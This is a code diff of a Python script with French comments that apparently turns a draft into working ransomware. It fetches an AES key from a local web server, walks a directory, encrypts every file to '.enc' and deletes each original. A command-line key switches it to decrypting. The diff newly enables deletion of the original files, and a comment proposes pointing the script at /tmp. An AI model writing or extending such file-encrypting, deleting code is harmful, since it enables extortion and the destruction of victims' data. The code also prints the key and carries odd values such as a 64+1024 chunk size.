@@ -4,22 +4,7 @@ import os
 import random
 import struct
 import requests
-
-#faire une requête get au serveur web pour récupérer la clé et l'iv
-url = 'http://localhost:8888/key.txt'
-resp = requests.get(url)
-key=resp.text
-
-url = 'http://localhost:8888/iv.txt'
-resp = requests.get(url)
-iv=resp.text
-
-#pour voir si la key est bien dans la variable, A SUPPRIMER#
-print(key)
-print(iv)
-
-# a changer en /tmp
-baseUrl = './copie'
+import sys
 
 
 def encryptFile(key, filename, out_filename=None, chunksize=64+1024):
@@ -28,7 +13,7 @@ def encryptFile(key, filename, out_filename=None, chunksize=64+1024):
         out_filename = filename + '.enc'
 
     # iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
-    #iv = Random.new().read(AES.block_size)
+    iv = Random.new().read(AES.block_size)
 
     encryptor = AES.new(key, AES.MODE_CBC, iv)
     filesize = os.path.getsize(filename)
@@ -70,20 +55,44 @@ def decryptFile(key, filename, out_filename=None, chunksize=24*1024):
             outfile.truncate(origsize)
 
 
+def main(argv):
 
-for root, dirs, files in os.walk(baseUrl, topdown=False):
-   for name in files:
-        file = os.path.join(root, name)
-        print(file)
-        # encrypt
-        if file[-4:] != ".enc":
-            print("[*] Encrypting... ")
-            encryptFile(key, file)
-            #pour supprimer le fichier d'origine
-            #os.remove(file)
+    #faire une requête get au serveur web pour récupérer la clé et l'iv
+    url = 'http://localhost:8888/key.txt'
+    resp = requests.get(url)
+    key=resp.text
 
-        # decrypt
-        if file[-4:] == ".enc":
-            print("[*] Decrypting... ")
-            decryptFile(key, file)
-        
+    #pour voir si la key est bien dans la variable, A SUPPRIMER#
+    print(key)
+
+    # a changer en /tmp
+    baseUrl = './copie'
+
+    is_decrypt = None
+
+    if len(argv) > 1:
+        is_decrypt = True
+        key = bytes(argv[1], 'utf-8')
+
+
+    for root, dirs, files in os.walk(baseUrl, topdown=False):
+       for name in files:
+            file = os.path.join(root, name)
+            print(file)
+
+            # decrypt
+            if is_decrypt:
+                if file[-4:] == ".enc":
+                    print("[*] Decrypting... ")
+                    decryptFile(key, file)
+                    os.remove(file)
+            # encrypt
+            else:
+                if file[-4:] != ".enc":
+                    print("[*] Encrypting... ")
+                    encryptFile(key, file)
+                    os.remove(file)
+
+
+if __name__ == '__main__':
+    main(sys.argv)
